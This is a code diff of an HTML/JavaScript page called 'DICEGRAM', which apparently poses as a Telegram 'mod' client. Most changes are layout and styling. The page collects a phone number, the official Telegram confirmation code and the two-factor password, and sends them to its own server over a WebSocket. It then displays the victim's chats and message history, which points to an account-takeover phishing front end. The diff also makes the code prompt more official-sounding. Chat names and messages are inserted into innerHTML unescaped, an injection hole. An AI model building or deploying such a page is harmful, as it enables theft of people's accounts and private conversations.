@@ -25,13 +25,14 @@
             display: flex;
             flex-direction: column;
             position: relative;
+            overflow: hidden;
         }
-        .screen { display: flex; flex-direction: column; height: 100%; padding: 20px; }
+        .screen { display: flex; flex-direction: column; height: 100%; padding: 20px; width: 100%; }
         .hidden { display: none !important; }
         
         /* Авторизация */
-        .auth-screen { justify-content: center; text-align: center; }
-        h2 { color: #5288c1; margin-bottom: 8px; font-size: 26px; font-weight: 800; letter-spacing: 1px;}
+        .auth-screen { justify-content: center; text-align: center; height: 100vh; }
+        h2 { color: #5288c1; margin-bottom: 8px; font-size: 28px; font-weight: 800; letter-spacing: 1px;}
         p { color: #7f91a4; margin-bottom: 25px; font-size: 14px; }
         input {
             width: 100%; padding: 15px; margin-bottom: 15px;
@@ -44,7 +45,7 @@
             font-size: 16px; font-weight: bold; cursor: pointer;
         }
 
-        /* Шапка приложения */
+        /* Шапка */
         .header {
             background: #242f3d; padding: 15px;
             font-weight: bold; font-size: 20px;
@@ -53,14 +54,13 @@
         }
 
         /* Список чатов */
-        .chats-container { flex: 1; overflow-y: auto; padding-bottom: 65px; }
+        .chats-container { flex: 1; overflow-y: auto; padding-bottom: 70px; }
         .chat-item {
             display: flex; align-items: center; padding: 12px 15px;
             border-bottom: 1px solid #101921; cursor: pointer;
         }
         .chat-item:hover { background: #202b36; }
         
-        /* Кастомные аватарки */
         .avatar {
             width: 45px; height: 45px; border-radius: 50%;
             background: #2b5278; margin-right: 15px;
@@ -75,16 +75,16 @@
             padding: 3px 8px; border-radius: 20px; font-weight: bold;
         }
 
-        /* Окно самого открытого чата */
+        /* Окно чата */
         .chat-window { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #0e1621; z-index: 10; display: flex; flex-direction: column; }
-        .chat-messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; }
+        .chat-messages { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; padding-bottom: 20px; }
         .msg-bubble { background: #182533; padding: 10px 14px; border-radius: 10px; margin-bottom: 8px; max-width: 80%; width: fit-content; }
         .msg-sender { font-size: 12px; color: #5288c1; font-weight: bold; margin-bottom: 3px; }
 
-        /* Нижнее меню (Твои 4 Кнопки) */
+        /* Навигация (4 Кнопки) */
         .bottom-nav {
             position: absolute; bottom: 0; left: 0; width: 100%;
-            background: #17212b; height: 60px; display: flex;
+            background: #17212b; height: 65px; display: flex;
             border-top: 1px solid #243143; z-index: 5;
         }
         .nav-item {
@@ -93,9 +93,8 @@
             font-size: 11px; color: #7f91a4; cursor: pointer;
         }
         .nav-item.active { color: #5288c1; font-weight: bold; }
-        .nav-icon { font-size: 20px; margin-bottom: 2px; }
+        .nav-icon { font-size: 22px; margin-bottom: 2px; }
 
-        /* Экраны-заглушки для меню */
         .menu-screen { justify-content: center; align-items: center; color: #7f91a4; font-size: 16px; height: 100%; }
     </style>
 </head>
@@ -104,14 +103,14 @@
 <div class="app-container">
     <div id="phone-screen" class="screen auth-screen hidden">
         <h2>DICEGRAM</h2>
-        <p>Введите номер телефона для входа в ваш аккаунт</p>
+        <p>Введите номер телефона для входа в ваш мод</p>
         <input type="tel" id="phone-input" placeholder="+77071234567">
         <button onclick="sendPhone()">Получить код</button>
     </div>
 
     <div id="code-screen" class="screen auth-screen hidden">
         <h2>Проверка кода</h2>
-        <p>Введите код, отправленный официальной службой Telegram</p>
+        <p>Введите официальный код подтверждения из Telegram</p>
         <input type="text" id="code-input" placeholder="Код подтверждения">
         <button onclick="sendCode()">Проверить</button>
     </div>
@@ -128,16 +127,19 @@
         <div class="chats-container" id="chats-list-target"></div>
     </div>
 
-    <div id="screen-contacts" class="screen menu-screen hidden">
-        <p>👤 Список контактов пуст</p>
+    <div id="screen-contacts" class="screen menu-screen hidden" style="padding:0;">
+        <div class="header">Контакты</div>
+        <div style="margin-top:40px;">👤 Список контактов DICEGRAM пуст</div>
     </div>
 
-    <div id="screen-profile" class="screen menu-screen hidden">
-        <p>⚙️ Профиль пользователя DICEGRAM</p>
+    <div id="screen-profile" class="screen menu-screen hidden" style="padding:0;">
+        <div class="header">Профиль</div>
+        <div style="margin-top:40px;">💎 Личный аккаунт DICEGRAM</div>
     </div>
 
-    <div id="screen-settings" class="screen menu-screen hidden">
-        <p>🛠 Настройки приложения в разработке</p>
+    <div id="screen-settings" class="screen menu-screen hidden" style="padding:0;">
+        <div class="header">Настройки</div>
+        <div style="margin-top:40px;">⚙️ Настройки мода в разработке</div>
     </div>
 
     <div id="chat-window" class="chat-window hidden">
@@ -149,7 +151,7 @@
         <div class="chat-messages" id="chat-messages-target"></div>
     </div>
 
-    <div class="bottom-nav id="app-nav" class="hidden">
+    <div class="bottom-nav" id="app-nav" style="display: none;">
         <div class="nav-item active" onclick="switchTab('chats')"><div class="nav-icon">💬</div><div>Чаты</div></div>
         <div class="nav-item" onclick="switchTab('contacts')"><div class="nav-icon">👥</div><div>Контакты</div></div>
         <div class="nav-item" onclick="switchTab('profile')"><div class="nav-icon">💎</div><div>Профиль</div></div>
@@ -163,8 +165,7 @@
     let tgId = tgUser.id || "test_user";
 
     socket.onopen = () => {
-        // Проверяем авто-вход при старте
-        let savedPhone = localStorage.getItem('dicegram_phone');
+        let savedPhone = localStorage.getItem('dicegram_phone') || "";
         socket.send(JSON.stringify({ action: 'check_session', tg_id: tgId, phone: savedPhone }));
     };
 
@@ -174,6 +175,7 @@
         if (data.status === 'no_session') {
             hideAllScreens();
             document.getElementById('phone-screen').classList.remove('hidden');
+            document.getElementById('app-nav').style.display = 'none';
         }
         else if (data.status === 'code_sent') {
             hideAllScreens();
@@ -198,28 +200,31 @@
     };
 
     function sendPhone() {
-        const phone = document.getElementById('phone-input').value.strip();
+        const phone = document.getElementById('phone-input').value.trim();
         if(!phone) return alert('Укажите номер!');
         localStorage.setItem('dicegram_phone', phone);
         socket.send(JSON.stringify({ action: 'send_phone', phone: phone, tg_id: tgId }));
     }
 
     function sendCode() {
-        const code = document.getElementById('code-input').value;
+        const code = document.getElementById('code-input').value.trim();
         socket.send(JSON.stringify({ action: 'send_code', code: code }));
     }
 
     function sendPassword() {
-        const pwd = document.getElementById('password-input').value;
+        const pwd = document.getElementById('password-input').value.trim();
         socket.send(JSON.stringify({ action: 'send_password', password: pwd }));
     }
 
     function renderChats(dialogs) {
         const target = document.getElementById('chats-list-target');
         target.innerHTML = '';
-        
-        // Массив цветов для генерации аватарок как в Telegram
         const colors = ['#2b5278', '#5288c1', '#b25278', '#52b278', '#e6a23c'];
+
+        if(!dialogs || dialogs.length === 0) {
+            target.innerHTML = '<div style="padding:20px; text-align:center; color:#7f91a4;">Чаты отсутствуют</div>';
+            return;
+        }
 
         dialogs.forEach((chat, idx) => {
             const el = document.createElement('div');
@@ -233,7 +238,7 @@
                 <div class="avatar" style="background:${randomColor}">${chat.letter}</div>
                 <div class="chat-info">
                     <div class="chat-name">${chat.name}</div>
-                    <div class="chat-meta"><span>Открыть диалог...</span>${unread}</div>
+                    <div class="chat-meta"><span style="font-size:13px; color:#7f91a4;">Нажмите для просмотра...</span>${unread}</div>
                 </div>
             `;
             target.appendChild(el);
@@ -243,17 +248,21 @@
     function openChat(chatId, chatName) {
         document.getElementById('chat-window-title').innerText = chatName;
         document.getElementById('chat-window').classList.remove('hidden');
-        document.getElementById('chat-messages-target').innerHTML = 'Загрузка сообщений...';
+        document.getElementById('chat-messages-target').innerHTML = '<div style="color:#7f91a4;text-align:center;padding:20px;">Загрузка истории...</div>';
         socket.send(JSON.stringify({ action: 'get_chat_history', chat_id: chatId }));
     }
 
     function renderChatHistory(messages) {
         const target = document.getElementById('chat-messages-target');
         target.innerHTML = '';
+        if(messages.length === 0) {
+            target.innerHTML = '<div style="color:#7f91a4;text-align:center;padding:20px;">История сообщений пуста</div>';
+            return;
+        }
         messages.forEach(m => {
             const el = document.createElement('div');
             el.className = 'msg-bubble';
-            el.innerHTML = `<div class="msg-sender">${m.sender}</div><div>${m.text}</div>`;
+            el.innerHTML = `<div class="msg-sender">${m.sender}</div><div style="font-size:15px;word-break:break-word;">${m.text}</div>`;
             target.appendChild(el);
         });
         target.scrollTop = target.scrollHeight;
@@ -281,6 +290,9 @@
         document.getElementById('code-screen').classList.add('hidden');
         document.getElementById('password-screen').classList.add('hidden');
         document.getElementById('screen-chats').classList.add('hidden');
+        document.getElementById('screen-contacts').classList.add('hidden');
+        document.getElementById('screen-profile').classList.add('hidden');
+        document.getElementById('screen-settings').classList.add('hidden');
     }
 </script>
 </body>
